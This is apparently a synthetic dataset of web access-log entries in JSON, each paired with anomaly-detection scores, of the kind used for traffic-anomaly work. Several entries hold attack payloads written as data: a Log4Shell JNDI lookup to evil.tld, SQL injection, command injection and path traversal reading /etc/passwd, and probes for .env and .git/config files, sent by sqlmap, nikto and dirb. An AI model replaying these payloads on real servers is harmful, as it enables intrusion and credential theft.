score_content,score_session,score_fused,line
1.5785331726074219,68.06837463378906,34.82345390319824,{"remote_addr": "232.148.156.53", "time_local": "11/Jan/2025:09:00:24 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 10691, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
2.4143829345703125,649.1557006835938,325.78504180908203,{"remote_addr": "107.232.239.212", "time_local": "11/Jan/2025:09:00:25 -0700", "request": "DELETE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 7850, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.502751350402832,55.15020751953125,28.82647943496704,{"remote_addr": "246.211.245.94", "time_local": "11/Jan/2025:09:00:26 -0700", "request": "DELETE /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 7551, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
5.9210591316223145,588.5274658203125,297.2242624759674,{"remote_addr": "131.191.13.248", "time_local": "11/Jan/2025:09:00:26 -0700", "request": "OPTIONS /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 15117, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
5.943602561950684,781.7283935546875,393.8359980583191,{"remote_addr": "3.19.247.160", "time_local": "11/Jan/2025:09:00:26 -0700", "request": "OPTIONS /profile HTTP/2", "status": 200, "body_bytes_sent": 14930, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
5.044557571411133,1886.0015869140625,945.5230722427368,{"remote_addr": "159.146.220.148", "time_local": "11/Jan/2025:09:00:27 -0700", "request": "HEAD /about HTTP/2", "status": 304, "body_bytes_sent": 405, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
3.278308868408203,5734.44970703125,2868.864007949829,{"remote_addr": "195.74.150.80", "time_local": "11/Jan/2025:09:00:28 -0700", "request": "DELETE /cgi-bin/test.cgi HTTP/2", "status": 403, "body_bytes_sent": 1274, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
1.408635139465332,81.9624252319336,41.68553018569946,{"remote_addr": "221.94.13.196", "time_local": "11/Jan/2025:09:00:29 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 8039, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
4.534123420715332,795.81201171875,400.17306756973267,{"remote_addr": "110.202.137.45", "time_local": "11/Jan/2025:09:00:30 -0700", "request": "HEAD /api/user?id=1;DROP TABLE users HTTP/2", "status": 200, "body_bytes_sent": 7324, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
3.2432591915130615,6609.8505859375,3306.5469225645065,{"remote_addr": "135.22.221.189", "time_local": "11/Jan/2025:09:00:30 -0700", "request": "DELETE /api/product?id=123 HTTP/2", "status": 429, "body_bytes_sent": 21, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.5155872106552124,816.1782836914062,408.84693545103073,{"remote_addr": "223.128.105.15", "time_local": "11/Jan/2025:09:00:31 -0700", "request": "POST /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 16337, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
2.2864770889282227,11983.6044921875,5992.945484638214,{"remote_addr": "159.164.148.146", "time_local": "11/Jan/2025:09:00:32 -0700", "request": "GET /.git/config HTTP/2", "status": 502, "body_bytes_sent": 1311, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
2.6041672229766846,818.7517700195312,410.67796862125397,{"remote_addr": "48.180.192.247", "time_local": "11/Jan/2025:09:00:33 -0700", "request": "DELETE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 15683, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
5.99889612197876,2099.55810546875,1052.7785007953644,{"remote_addr": "31.76.45.245", "time_local": "11/Jan/2025:09:00:34 -0700", "request": "OPTIONS /login HTTP/2", "status": 302, "body_bytes_sent": 14667, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
1.7008042335510254,724.3612060546875,363.03100514411926,{"remote_addr": "178.7.254.133", "time_local": "11/Jan/2025:09:00:34 -0700", "request": "GET /.env HTTP/2", "status": 200, "body_bytes_sent": 7703, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
6.068758487701416,114.38102722167969,60.22489285469055,{"remote_addr": "167.222.67.42", "time_local": "11/Jan/2025:09:00:35 -0700", "request": "OPTIONS /dashboard HTTP/2", "status": 200, "body_bytes_sent": 12828, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.346150279045105,619.2472534179688,310.2967018485069,{"remote_addr": "152.60.219.133", "time_local": "11/Jan/2025:09:00:35 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 3031, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.5140788555145264,829.4044189453125,415.4592489004135,{"remote_addr": "3.164.104.196", "time_local": "11/Jan/2025:09:00:36 -0700", "request": "GET /about HTTP/2", "status": 200, "body_bytes_sent": 2081, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
4.579010963439941,871.4207763671875,437.9998936653137,{"remote_addr": "236.174.50.244", "time_local": "11/Jan/2025:09:00:37 -0700", "request": "HEAD /logout HTTP/2", "status": 200, "body_bytes_sent": 7987, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
4.579286575317383,778.1107177734375,391.34500217437744,{"remote_addr": "1.69.139.109", "time_local": "11/Jan/2025:09:00:37 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 2536, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
1.5022592544555664,791.1966552734375,396.34945726394653,{"remote_addr": "192.28.201.90", "time_local": "11/Jan/2025:09:00:39 -0700", "request": "POST /index.html HTTP/2", "status": 201, "body_bytes_sent": 1520, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
1.2063159942626953,564.4157104492188,282.8110132217407,{"remote_addr": "241.134.154.158", "time_local": "11/Jan/2025:09:00:40 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 3797, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.0278687477111816,829.6456298828125,415.83674931526184,{"remote_addr": "54.70.233.131", "time_local": "11/Jan/2025:09:00:41 -0700", "request": "PUT /login HTTP/2", "status": 200, "body_bytes_sent": 2549, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
1.4179975986480713,619.58447265625,310.50123512744904,{"remote_addr": "48.34.101.220", "time_local": "11/Jan/2025:09:00:42 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 1439, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.0764005184173584,5682.95458984375,2842.5154951810837,{"remote_addr": "129.58.100.212", "time_local": "11/Jan/2025:09:00:42 -0700", "request": "GET /dashboard HTTP/2", "status": 403, "body_bytes_sent": 1002, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
1.762347936630249,580.45947265625,291.1109102964401,{"remote_addr": "4.239.7.73", "time_local": "11/Jan/2025:09:00:43 -0700", "request": "GET /logout HTTP/2", "status": 200, "body_bytes_sent": 1604, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
5.044857025146484,732.88916015625,368.96700859069824,{"remote_addr": "127.12.132.203", "time_local": "11/Jan/2025:09:00:43 -0700", "request": "HEAD /../../etc/passwd HTTP/2", "status": 204, "body_bytes_sent": 16769, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
1.9251554012298584,690.0003662109375,345.9627608060837,{"remote_addr": "254.98.31.71", "time_local": "11/Jan/2025:09:00:44 -0700", "request": "PUT /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 14907, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
11.321222305297852,764.1743774414062,387.74779987335205,{"remote_addr": "193.233.89.23", "time_local": "11/Jan/2025:09:00:45 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 3867, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
6.429384708404541,5987.693359375,2997.0613720417023,{"remote_addr": "142.57.140.245", "time_local": "11/Jan/2025:09:00:46 -0700", "request": "OPTIONS /search?q=phone HTTP/2", "status": 403, "body_bytes_sent": 1380, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
5.056708335876465,5884.74609375,2944.9014010429382,{"remote_addr": "21.135.173.44", "time_local": "11/Jan/2025:09:00:47 -0700", "request": "HEAD /about HTTP/2", "status": 401, "body_bytes_sent": 123, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
1.9662790298461914,5869.42724609375,2935.696762561798,{"remote_addr": "130.76.206.191", "time_local": "11/Jan/2025:09:00:48 -0700", "request": "POST /server-status HTTP/2", "status": 400, "body_bytes_sent": 1134, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
1.6548153162002563,2077.182861328125,1039.4188383221626,{"remote_addr": "43.135.218.100", "time_local": "11/Jan/2025:09:00:48 -0700", "request": "GET /search?q=camera HTTP/2", "status": 304, "body_bytes_sent": 7749, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
1.8106836080551147,5777.0849609375,2889.4478222727776,{"remote_addr": "212.129.23.178", "time_local": "11/Jan/2025:09:00:49 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 400, "body_bytes_sent": 250, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
5.935844898223877,1874.064208984375,940.0000269412994,{"remote_addr": "183.125.176.42", "time_local": "11/Jan/2025:09:00:50 -0700", "request": "OPTIONS /api/products HTTP/2", "status": 302, "body_bytes_sent": 16715, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.7832484245300293,815.1563720703125,408.46981024742126,{"remote_addr": "56.17.25.182", "time_local": "11/Jan/2025:09:00:50 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 10325, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
2.856348991394043,787.3762817382812,395.11631536483765,{"remote_addr": "164.210.110.24", "time_local": "11/Jan/2025:09:00:51 -0700", "request": "TRACE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 15888, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
4.352440357208252,583.4425048828125,293.8974726200104,{"remote_addr": "130.241.94.7", "time_local": "11/Jan/2025:09:00:51 -0700", "request": "HEAD /index.html HTTP/2", "status": 200, "body_bytes_sent": 7991, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
7.385587692260742,12071.8544921875,6039.62003993988,{"remote_addr": "208.29.197.239", "time_local": "11/Jan/2025:09:00:52 -0700", "request": "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 503, "body_bytes_sent": 119, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
1.3772315979003906,685.7749633789062,343.5760974884033,{"remote_addr": "62.68.157.80", "time_local": "11/Jan/2025:09:00:53 -0700", "request": "TRACE /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 10011, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.6521892547607422,5565.90673828125,2783.7794637680054,{"remote_addr": "232.1.149.96", "time_local": "11/Jan/2025:09:00:54 -0700", "request": "GET /contact HTTP/2", "status": 400, "body_bytes_sent": 1327, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.0853335857391357,5218.458984375,2610.2721589803696,{"remote_addr": "103.7.151.168", "time_local": "11/Jan/2025:09:00:54 -0700", "request": "TRACE /logout HTTP/2", "status": 403, "body_bytes_sent": 560, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.899686574935913,728.185302734375,365.04249465465546,{"remote_addr": "79.82.77.94", "time_local": "11/Jan/2025:09:00:56 -0700", "request": "GET /.env HTTP/2", "status": 200, "body_bytes_sent": 16526, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
6.626110076904297,565.2413330078125,285.9337215423584,{"remote_addr": "37.126.156.64", "time_local": "11/Jan/2025:09:00:56 -0700", "request": "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 5806, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
1.834831953048706,530.8416748046875,266.3382533788681,{"remote_addr": "19.66.229.237", "time_local": "11/Jan/2025:09:00:57 -0700", "request": "GET /admin HTTP/2", "status": 200, "body_bytes_sent": 294, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
3.139298439025879,783.9275512695312,393.53342485427856,{"remote_addr": "141.238.71.215", "time_local": "11/Jan/2025:09:00:58 -0700", "request": "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 5566, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
1.9571043252944946,67.21711730957031,34.587110817432404,{"remote_addr": "15.220.37.131", "time_local": "11/Jan/2025:09:00:59 -0700", "request": "PUT /api/products HTTP/2", "status": 204, "body_bytes_sent": 4429, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
3.116269111633301,11268.44140625,5635.778837680817,{"remote_addr": "161.234.120.82", "time_local": "11/Jan/2025:09:00:59 -0700", "request": "TRACE /search?q=phone HTTP/2", "status": 500, "body_bytes_sent": 262, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.4774876832962036,813.8291625976562,407.6533251404762,{"remote_addr": "18.186.68.172", "time_local": "11/Jan/2025:09:00:59 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 3099, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
3.704317808151245,6571.84375,3287.7740339040756,{"remote_addr": "229.232.94.121", "time_local": "11/Jan/2025:09:01:00 -0700", "request": "DELETE /logout HTTP/2", "status": 429, "body_bytes_sent": 597, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.5674799680709839,1972.414306640625,986.990893304348,{"remote_addr": "130.249.42.223", "time_local": "11/Jan/2025:09:01:00 -0700", "request": "POST /login HTTP/2", "status": 304, "body_bytes_sent": 3048, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.7833046913146973,792.7413330078125,397.2623188495636,{"remote_addr": "127.189.170.139", "time_local": "11/Jan/2025:09:01:01 -0700", "request": "PUT /../../etc/passwd HTTP/2", "status": 204, "body_bytes_sent": 6233, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
1.308998942375183,774.3934326171875,387.85121577978134,{"remote_addr": "116.40.241.67", "time_local": "11/Jan/2025:09:01:02 -0700", "request": "GET /dashboard HTTP/2", "status": 201, "body_bytes_sent": 2471, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
2.6209182739257812,5207.0087890625,2604.814853668213,{"remote_addr": "161.192.103.111", "time_local": "11/Jan/2025:09:01:02 -0700", "request": "TRACE / HTTP/2", "status": 404, "body_bytes_sent": 76, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.5854994058609009,2108.766357421875,1055.175928413868,{"remote_addr": "213.32.43.176", "time_local": "11/Jan/2025:09:01:03 -0700", "request": "POST /login HTTP/2", "status": 301, "body_bytes_sent": 15437, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
